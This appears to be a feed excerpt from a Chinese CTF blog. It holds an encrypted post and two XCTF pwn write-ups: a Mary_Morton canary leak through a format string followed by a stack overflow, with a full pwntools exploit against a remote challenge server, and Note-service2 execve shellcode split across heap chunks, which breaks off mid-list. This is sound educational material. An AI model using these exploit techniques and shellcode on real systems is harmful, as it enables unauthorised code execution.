64ee80454ddb153a528adbeafa3b8512ecd30729187443c2db8171f8c7c394341d896378cdd8f4614c0f596348ed067166184192260c6556919e2760a9cef66de7e9e25f6ccc758ccef21d1e70bf9d6063c0fb3e8bae131cece04321aa66179975936f355174c0d00ad4fd9d78fe4ff08fa85d1d3ae839e95d916a99e8f99123e717a2f6efb671c078710f6a10eeb1d39bf78e13a30723b9cbc6c78d4f2dbc5e1d689c0bec57e2b812c205497e9801dbc884b1de1e9a96716ac1deed08b17e87f2f9990cd85d937045520882095ec2ac37baa629236708b970cf417101a7532ebe3786363409e7792dac6b033d4f81e33747c13162a23068c681bfce078d4195879597460d96dda948c089d5a11e4d2527bda37d5b945cf57c2b6468b28af2504ef7422f12470fb74b74454e5c66b0b07a91b44175660105c93c0df05a896f95863f9f3d92bdb5d9ea571890a6a1b360d7a223086e33f21c0c75738ea2b29a28d4171ce9465ec165844d93a667600e0b24c485ec8d8345ef4880abd4d0bc39e1c6e66a1d1a46d7f7db7b6bf9e2198bfd8756b6f17d6ae3eef0ef57b260369e12f5623a69ed2bacf1706a09f3dfaf1e7e7ffe752d9c2f1547337476b6881a53401a89a177d5352d5873527df0f499939454fc38771d042c22bae1b8b0da60112145538ea6a7ca5f8c6c12b1c07cca5d4751f9d2820234f042515f76e24c142b888e25f69dc566798133d05c5dad593d7ce14ce49e632b8908c3b86ab50d145bf9f17619706d3369e89af2a50bbd0de892cd788eeb85b192180565e58840fb893cd4db9dc4dccd3aafdbbc597abbb384fb9938611dbab51373b2fa5b495be68e1a1642c757c5060fe818086d6baf7b3c768d127e3c8083227152bcde2c3ed269f23493812705ae6a6b1f8837eb12e7587bfa657c53ea2285a0c459f5e224e3be1d176d53a15f36ace6cd27388672a8df35b80666a1bc8d3b95177e6ccbdf338aeea46cd963abf2f168fd76c0415e077aa8174a54e6ccbbe794a1578865fc8fffcd6a48dec25640bd220b2748e6a05b56aedf3723a50eaf4d865188d681b3d919a9a29c13f7bcff1d59984b02890c2f49546faede27b06a7afeba70db91a20405f38974edb7ca3c2f7241941926e38d3c032ca506063ec7e8f9d31007f6fd982380c71408e2653ea04f7a5af7e36e1950f798817d8cda34275a5a25a70f1b1ac2c338ad6f93c2f63c39274c4df75486b70acd3fc01d98812449e934c6e24e59e07d0f073eff046d699a0e5165fcfc6d2c16a46c3a6581181ad451ef42cb959c52e9245118c45ca6d3afd4da6aa1cf56b679f4d46d57772e2dd3e4535cb04f7e0e00673f2d0492441ec2823236660bc1ba7937c9e0ffb92306f5e3ddeff9485c9621cb5b0042d084c4e47e6b0b37d09a5c99be813814c7873933ca9929be6fb1baad488ae509487f96d03dbac25f24dd153cc10a71585653f281c3065a233978ac3f2db866cd5b13b8db3d8a560b61168ecb8fcaaf9e027f7b2cab7362184357d17cda0a5b6418758598b9f95c3873e3735bbf75c81dc40196af4fa92c78117a4d63399cc027c8f899479a93ab4f1f3288f683229afa099dcb31018e6065c8c4d62847491d633c609e2fd069410b2bfedc6bfb0a571d99b018f6035b56c739c6c0229cda4f3174dc10f7808312fed1db009be947c00cef72ba88bbc9827e358f1db4305c64c2ab368294a21bb8f5bdd875c997925cb6e48dfe27bf8c44cf8aac23eea9f8fb9ddf38d56cca711e77843d644075c8f8c57f1f2a4a544d7ef963e7e17a8aeafd775c6fe218f07f38cbc291130ee1d5d91118cae18338542eb128b945791cf04f2f8903be6948ec55f128c39296a5af36563036c68f6ba30870a8e4b73c10c7331bb8d4dd9f5308f01aa33ddcfdf2ba49ffd83fa467a7c940a21b866dd8b428c6904eef0ee55c0065381673326d6ac939a5e868c1fb5160fc9eeaf3a2b4ca328a95c1044ceb9e2a2f04a805caa9224ca3494b331dfa21ffa3a5f55efee93624a9b90654e35beb6faa23f803d01243b9fb9068bf785d83d30240d52ac414fd9ad9aa07b5649805f79988a0afcf35ce8091ec94a7effe4d276fbac23d2801e642e9335ed2b84d2883c40cead235c2dd371e3f7ae0b3ca989e2017fb7fea2ed90ecc47149b0068f00c356360874579d4d42d06017f11586f2f21c9300985f1dee5c387c0c0b39a9be795672dd1a70e55640dc1be29c4ebedfd56dacba0b63a21df80bbae7bd19835d04bf6d9470ccfb295c355df670f8d826fff49dff9d96e63b918cc826faa94da2d664dd5c743efa9c50ca9d75b5fed5fb711d2ef6f9cd713eafa0d4cad54711a0d65b0ca95dd16a870d6577742f7430e3922b5e125e7ade00e90164ec1f8645e783e5fb14cbd309852de1cadd729260f42da3f662768c51356f81bcfa5c67b188b1343e275c9e89aae17de8e2a1a83736f61c01004ee953f3af82d0f2a4c3ed0a8efaf3fd12fb0567013997e05a7e3ed1701b3c9496b64d7b720c2f2b968d21aca48d09b39efac41a8b6676b82e016540e6e5dcf98a8e1abedb98cf3848b69237503af6cb05154bedd4ee121b6701f55cc325ed33573794703d58913d48d05432167f764053f010b4ece2411965ecee024953d3d7a4772ecfcab67dac0c4f56a4681aeccf878a4b478942737d3988d7dc1f95f67f8d41a27f93032f4d58262c930e8dd9d24e8cb5c0159a563f9add806a6cd23af9226bc48ad4a07a237f89edb234d6df799eb47f46c9491bbcdbdc2c2ba4a00a377ca5f061608770c86862a65fd9261200dcc2dc846487373a443c3a216f25f06f5b89072b662db8f2cd5353653c752e15a932e894fa2811cb3cf02241173a2f051eff600fa0eef387fb01a481fc03df92d4e6eeb8d81d32271077e50f89f6ba8076e9ab1b90165af27916b06a1867c2ecbabe75523aa8f07c8ac6f9f2c09f000edcf7378a380531ac5fbd69069671bb8c88966d5a16cf5a9afd61e06df4bbdd97bcada577a309d4e27db260b1d5eefa067dca9a95be82ce4492378f729af5c32041a796336ff0a79ff6e4d10741a8151c17daecddaacb40f4478c4e1d29aefa1f0d697598fa38e4407e591e855b409b24766055ee34c56c53be20494badb1fadb14e095214caf7c84fc32378d68f0af181a2e391c7e73d1404f6661e53a1f2b2c86ec25b0c3d6b8396c79de81fcd5d46a87ad4201c3d922079d473a4803836bfa995b419c9a34423e1a53b7a5ebbdc5e22e3d1d6461eba7133c5d0f69b551bef8c303048ff08dd70f09efebae5f5f8a0fd1fbddbb8d215839c91f57c58aac3b7c873dc9122feeba28e841936928dfe9e55bfee9b7cc9fdad2a159cf0392d938d36925da7c7aa0d35e148b37e321b76bafb8431f4dead80ffde4368208001bad420e7f7b615774c6c15749295b68302fc14ac4b0dd9091c693e51e493f03291648d59e9d2dc14cd288bc0fb44040af9d61594065fe5e2bfc5d1d0983a36846c50d5ee4d1178ed5172b05743cbab24761b94a967acde580f587cf75ee9d74480dae34366681dd86147f3cfb2006aa5b458da8ff512bd8e266a8e3d1d655b9b751806792f14559388d34de5d4eb30ff3acb64417c918d2a3e65409218b55c0cc8e683734e1fbd073d2f8cec8f3749160e521c2220b28fb2caeee0435a4d6425fb236ef18994c7e291a75b7265648f4a0f7c4ae80256eb1fc16bf9385901aca495bd15d5cfbee76f8965a6c2bea84e116030708791bcf87b61a4ca5014168ae879107327da9e4e8466fd8e6aea0edf7c46c8bb20926fd546206b7ecd2a0a87d500fe448756b74fa9544158e614631549f3f9ba0aca7aeb26bbb4e51af976c39d96fa0dacd1154790c59eb939859ce14286aad8475a692ddca7c2e6d4218c3210b90dbbcd4bd9e169b7a85bb41abd0e7c0cee937cee08fc137e41d45f07909bef64ed12ecd9c9bb1f7b4d26106fb529373edc73bae38968c636e3c9312255f964c3ade78be0ce90d949f0eb99d8c39fef06e18ced6db36185eaaed0d73416506dc3b16de445f5952e5214ecaf615beb9b81de65bdef429d3bc9bef7c13266a47d2eace4f15999ad48393b06bedd992a3df79a5b01246704381043b442007a5987c50a036600da9ad1c2e6369acce55adb6a3435a55de39d24bcac32a42e06ea06c8ceab2b45979685d204145f03e6c088dd0fc358bf3b61417aa95d7b43cbf3ab491bc74813dc63f0c64398c78b5b7acdabdb5a5bf8b4fd403fc26eff44e9de2e901986c3bfb9e9cfe7352099a3b1fdc356e94320d439d14ce12b5b132190d5ad9e88be12d0433d063099b87c58cb62e48847f528543f5631169b7b54a0f313b67996df7f029a13e8247125a32c2a82b2c78854629de80c3d3d20054ee401413cc8eea65ce9e032107ae0273706567acb84433bce0c6c084979cc2cb90dd18a66be53d5f3c6e1178943947934bedda3901551547ea2758e0e47095eefd1e681a877a40f75b8ebc74b65c174932da93d4f97eb1b4a855c28dc0a8515cf53f92d07908875e634fb24881afcfb1bb0c6b27a22adec838b8d1237d93eeaf0e97cb10e16be63b342bf434eae51b515c7fdb2121b1c2b0a10fbd31ba6cb75c5bc51dcbcc1d0b1309487a9dbfafb920a2669730f484e6f55453b09b20cf9d07f71a52429c704fcf37724352098865d4b09416889bc492bfa1817b470faf39cb37ae809c96ba5577e0acc62acd09ad91589d8422ff60645e14e55227412e4ce2d4082f1ba5daad1a06c5a4e1a6c604cfa9523c252e4b15750175e78d3adbb12c2b305e4dce893961c5413ddb64b85d2fad80aa25c45a5aacb3e5d5f6b9752b2f518add44da4ffe597cc7a2dd1dabd040b55e08da1fdae4954054abd3a6dab5eb06352917dc4b8659cd2801d82577f979f71c96ffee06c1605d4387e978df5a02d780f99b84655b2c0dfb5fb908d0aefcdbb657ca5eba34b9c835bdf193afe4c8d75af34a8cf50179495d05eebcf889023c38243c612ee20fb64091052a58b6f8e3da55693a7c075396776b8733faac1600cc8628850b669fc78dd1e1414665352310b042272f8fa370bd88ecae0c9090bda32125aa333d2a26683d6f764dc1540da6e0bcbe938017119c04a9a341cba8c1122bcb2f0654ed47988d50c0730f373c398fd4ea8c5d8bcdefc44437782fa0f2125d34c3d478a9e44279889f50c7b9d6462cd6477e606ee28e7e1405395670799207fa13bad33f2f8e7ec40a809089755b7e940b900b32e19572895c54aab98061afedd153aaec4eea2182d2b873383c4ed0267f3393b405eb6449ad01dfffdc65a96c25f4497e6f7d0db63b59a8b044465a677c4606ba7e1f6dbfdb5bfcda148c032423097a4a8e8b0d27cc43368fa5e69a90a320a56b1a30234557c217d48dabc99fdaab4b371847af495ac31c6ec943477f53a70d5d03ea1be15296273fafb5f02dfacb5dd79a27</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）</title>
    <link href="https://muzibing.github.io/2020/07/19/2020.07.19%EF%BC%88138%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/19/2020.07.19（138）/</id>
    <published>2020-07-18T16:00:00.000Z</published>
    <updated>2020-07-25T03:07:52.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识点font"></a> <font color="navy"><code>0x00 相关知识点</code></font></h3><blockquote><ul><li>格式化字符串的利用</li><li>金丝雀的绕过</li><li>栈的溢出</li></ul></blockquote><h3 id="font-color-navy0x01-分析题目font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-分析题目font"></a> <font color="navy"><code>0x01 分析题目</code></font></h3><blockquote><p>既然题目说是个非常简单的热身的pwn，那我就简单的<b>热一下身</b></p></blockquote><h4 id="font-color-blue1file-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-maryfont"></a> <font color="blue"><code>1.file mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file mary</span><br><span class="line">mary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><h4 id="font-color-blue2checksec-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-maryfont"></a> <font color="blue"><code>2.checksec mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec mary</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/Mary_Morton/mary&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>可以看出开启了金丝雀保护和栈不可执行保护，因此我们可能需要对金丝雀进行绕过</p></blockquote><h4 id="font-color-blue3试运行程序font"><a class="markdownIt-Anchor" href="#font-color-blue3试运行程序font"></a> <font color="blue"><code>3.试运行程序</code></font></h4><p><img src="/images/138-1.png" alt></p><blockquote><p>从上图可以得知，该程序有两个选项：栈溢出和格式化字符串漏洞，那说明选项1可能有栈溢出的风险，选项2可能有格式化字符串漏洞的风险，这是我们试运行程序得到的信息，下面我就看看该程序的伪代码。</p></blockquote><h4 id="font-color-blue4获取程序的伪代码font"><a class="markdownIt-Anchor" href="#font-color-blue4获取程序的伪代码font"></a> <font color="blue"><code>4.获取程序的伪代码</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图是程序选项为<code>1</code>时的伪代码，可以看出该模块是有栈溢出漏洞的危害</p></blockquote><p><img src="/images/138-3.png" alt></p><blockquote><p>上图是程序选项为<code>2</code>时的伪代码，可以看出该模块有格式化字符串漏洞</p></blockquote><h3 id="font-colornavy0x02-解题思路font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-解题思路font"></a> <font color="navy"><code>0x02 解题思路</code></font></h3><p>      从上文对题目的分析以后，我们可以有一种利用思路是：</p><blockquote><ol><li>通过格式化字符串漏洞将Canary泄露出来</li><li>再通过选项1的栈溢出执行shellcode</li></ol></blockquote><p>      下面我们看看怎么写exp脚本：</p><h4 id="font-color-blue1泄露canaryfont"><a class="markdownIt-Anchor" href="#font-color-blue1泄露canaryfont"></a> <font color="blue"><code>1.泄露canary</code></font></h4><p>      通过上图可以看出，我们输入的<code>AAAAAAAA</code>，距离格式化字符串有6个位置，但是去掉前5个寄存器的位置，那么就是格式化字符串和<code>buf</code>的位置相邻，那么下面我们确定一下金丝雀的位置：</p><p><img src="/images/138-4.png" alt></p><blockquote><p>可以从上图看出，金丝雀的位置为<code>rbp-0x8</code>，因为<code>buf</code>的距离<code>rbp</code>的位置有<code>0x90</code>，所以我们可以得出<code>buf</code>距离 Canary有<code>0x88</code>，也就是<code>0x88/8=17</code>个地址单位，那么距离格式化字符串有<code>17（buf到canary的距离）+5（5个寄存器）+1（canary本身）=23</code>个单位，如下图所示：</p></blockquote><p><img src="/images/138-5.jpg" alt></p><blockquote><p>那么我们可以将格式化字符串设置为<code>%23$p</code>，下图是运行程序时输入的<code>%23$p</code>，输出结果为<code>0x2c3bceda73691600</code>，从后两位可得这是canary，那么我们就成功的把金丝雀泄露出来了。</p></blockquote><p><img src="/images/138-6.png" alt></p><h4 id="font-color-blue2栈溢出font"><a class="markdownIt-Anchor" href="#font-color-blue2栈溢出font"></a> <font color="blue"><code>2.栈溢出</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图中的buf可以输入的空间大小有<code>0x100</code>，而buf到ebp的距离却只有<code>0x90</code>，所以说这里存在着栈溢出的漏洞，但是有因为有canary，所以利用方式如下图：</p></blockquote><p><img src="/images/138-7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary mary --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400464 : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary mary --string &quot;flag&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400b36 : flag</span><br></pre></td></tr></table></figure><blockquote><p>从上面的搜索结果中可以看出，该程序中里面包含“system”和“flag”的，下面我们就在IDA中搜索一下位置，看一下是否有可以直接利用的shellcode，若然还真有，如下图：</p></blockquote><p><img src="/images/138-8.png" alt></p><blockquote><p>地址为<code>0x4008DA</code>，下面我们就可以构造exp了</p></blockquote><h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 exp</code></font></h3><p><code>选项2泄露canary，选项1进行栈溢出</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">36580</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string</span><span class="params">()</span>:</span></span><br><span class="line">payload1 = <span class="string">"%23$p"</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">canary = int(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] The value of Canary is"</span>,canary)</span><br><span class="line"><span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span><span class="params">(canary)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = (<span class="number">0x90</span><span class="number">-0x8</span>)*<span class="string">"a"</span> + str(p64(canary),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">8</span> + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">start()</span><br><span class="line">canary = format_string()</span><br><span class="line">overflow(canary)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="栈相关题目" scheme="https://muzibing.github.io/tags/%E6%A0%88%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Note-service2】在堆上执行shellcode</title>
    <link href="https://muzibing.github.io/2020/07/18/2020.07.18%EF%BC%88137%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/18/2020.07.18（137）/</id>
    <published>2020-07-17T16:00:00.000Z</published>
    <updated>2020-07-19T02:55:37.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基础知识font"></a> <font color="navy"><code>0x00 基础知识</code></font></h3><h4 id="font-color-blue1什么是shellcodefont"><a class="markdownIt-Anchor" href="#font-color-blue1什么是shellcodefont"></a> <font color="blue"><code>1.什么是shellcode</code></font></h4><blockquote><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。 ——维基百科</p></blockquote><h4 id="font-color-blue2shellcode的c语言形式font"><a class="markdownIt-Anchor" href="#font-color-blue2shellcode的c语言形式font"></a> <font color="blue"><code>2.shellcode的C语言形式</code></font></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *code[<span class="number">2</span>]; </span><br><span class="line">    code[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>; </span><br><span class="line">    code[<span class="number">1</span>] = <span class="literal">NULL</span>; </span><br><span class="line">    execve(code[<span class="number">0</span>], code, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>再将上述代码进行简化：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>,<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="font-color-blue3shellcode的汇编形式font"><a class="markdownIt-Anchor" href="#font-color-blue3shellcode的汇编形式font"></a> <font color="blue"><code>3.shellcode的汇编形式</code></font></h4><blockquote><p>将上述代码进行编译，然后在反汇编，就可以看到其汇编代码，如下：（只关注main函数的）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0000000000001135 &lt;main&gt;:</span><br><span class="line">    1135:       55                      push   %rbp</span><br><span class="line">    1136:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1139:       48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">    113d:       89 7d fc                mov    %edi,-0x4(%rbp)</span><br><span class="line">    1140:       48 89 75 f0             mov    %rsi,-0x10(%rbp)</span><br><span class="line">    1144:       ba 00 00 00 00          mov    $0x0,%edx</span><br><span class="line">    1149:       be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">    114e:       48 8d 3d af 0e 00 00    lea    0xeaf(%rip),%rdi        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1155:       e8 d6 fe ff ff          callq  1030 &lt;execve@plt&gt;</span><br><span class="line">    115a:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">    115f:       c9                      leaveq </span><br><span class="line">    1160:       c3                      retq   </span><br><span class="line">    1161:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">    1168:       00 00 00 </span><br><span class="line">    116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure><blockquote><p>rax 保存系统调用号#59，这是execve的调用号<br>rdi  保存execve的第一个参数，是&quot;/bin/sh&quot;的地址<br>rsi  是指向前面用到的&quot;/bin/sh&quot;的指针开始并以空指针结尾的指针数组<br>rdx 是零，用来做execve的第三个参数<br>execve的原型是：<code>int execve(const char *filename, char *const argv[],char *const envp[]);</code></p></blockquote><p>      在很多题目中对输入的长度有限制，上述的shellcode就显得不起作用了，所以还需要精简shellcode，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3b</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rdi,XXX  # rdi代表的是“/bin/sh”的地址</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><blockquote><p>这是针对64位的，但是这种字节码就要比32位下的长很多，因为0x3b只需要占8个bit，所以将rax改为eax也可以，并且还减少了字节的长度，其他命令也是如此，rdi有点特殊，大家可以想一下。</p></blockquote><h4 id="font-color-blue4jmp-命令font"><a class="markdownIt-Anchor" href="#font-color-blue4jmp-命令font"></a> <font color="blue"><code>4.jmp *** 命令</code></font></h4><blockquote></blockquote><h3 id="font-color-navy0x01-解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-解题思路font"></a> <font color="navy"><code>0x01 解题思路</code></font></h3><h4 id="font-color-blue1file-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-pwnfont"></a> <font color="blue"><code>1.file pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line"></span><br><span class="line">pwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以得到该文件是一个64位的ELF文件</p></blockquote><h4 id="font-color-blue2checksec-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-pwnfont"></a> <font color="blue"><code>2.checksec pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/note-service2/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><blockquote><p>可以看出NX没有开启保护，并且<code>Has RWX segments</code>说明栈和堆上的代码可执行，也就是说我们可以将我们的shellcode放入栈中，然后进行执行，除此之外开启了地址无关代码，以及金丝雀保护。下面看看伪代码：</p></blockquote><p><code>addNote函数</code></p><p><img src="/images/137-1.png" alt></p><blockquote><p>从上图中可以看出，<font color="green">程序并没有对<code>qword_2020A0[v1]</code>数组的下标进行检查，</font>从而可能导致在任意地址上进行读写操作，甚至可能改变got表中的值。从上图还可以看出，我们只能申请8字节大小的堆空间，那么我们能输入的content有多大呢？下面我们就看一下<code>sub_B69((__int64)qword_2020A0[v1], v2);</code>函数，如下图：</p></blockquote><p><img src="/images/137-2.png" alt></p><blockquote><p>从上图中可以看出，我们能往chunk中输入的字符最多有7个字节，所以说我们上文所说的shellcode就无法全部输入进去，那么我们是否可以将这些shellcode分别输入到不同的chunk，然后用jmp命令将这些shellcode连接起来呢？首先我们来确定shellcode的划分：</p><ul><li>mov eax,0x3B：5字节</li><li>mov 